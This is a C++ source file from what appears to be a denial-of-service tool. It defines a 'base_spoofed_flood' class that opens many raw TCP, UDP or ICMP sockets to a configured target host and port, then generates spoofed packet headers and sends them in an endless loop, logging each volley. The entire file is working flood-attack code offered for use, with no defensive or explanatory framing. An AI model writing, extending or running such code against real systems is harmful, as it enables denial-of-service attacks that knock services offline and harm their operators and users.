#include "base_spoofed_flood.h"
#include "utils.h"

base_spoofed_flood::base_spoofed_flood(int protocol) : proto{protocol} {
  hdr_len = [&]() {
    switch (proto) {
    case IPPROTO_TCP:
    case IPPROTO_UDP:
      return 8192;
    case IPPROTO_ICMP:
      return 400;
    default:
      spdlog::get("logger")->error("protocol not found");
      exit(EXIT_FAILURE);
    }
  }();
}

void base_spoofed_flood::run() {
  std::vector<std::unique_ptr<Rsocket>> sockets{};
  init_sockets(sockets);
  char *hdr = nullptr;
  while (true) {
    for (auto &socket : sockets) {
      if (!socket->Alive())
        socket->Open();
      hdr = gen_hdr(socket->GetDst(), hdr_len);
      if (socket->Write(hdr, hdr_len) == -1) {
        socket->Close();
        socket->Open();
      }
      spdlog::get("logger")->info("Voly Sent");
      delete[] hdr;
    }
    utils::pause(Config::get().time);
  }
}

void base_spoofed_flood::init_sockets(
    std::vector<std::unique_ptr<Rsocket>> &sockets) {
  sockets.reserve(Config::get().conn);
  if (Config::get().tls)
    spdlog::get("logger")->error("tls is not available on spoofed packets");

  if (proto == IPPROTO_ICMP && Config::get().rand_lport)
    spdlog::get("logger")->error(
        "local port randomization is not available on icmp");

  for (int i = 0; i < Config::get().conn; ++i)
    sockets.emplace_back(std::unique_ptr<Rsocket>(
        new Rsocket(Config::get().rhost, Config::get().rport, proto)));
}
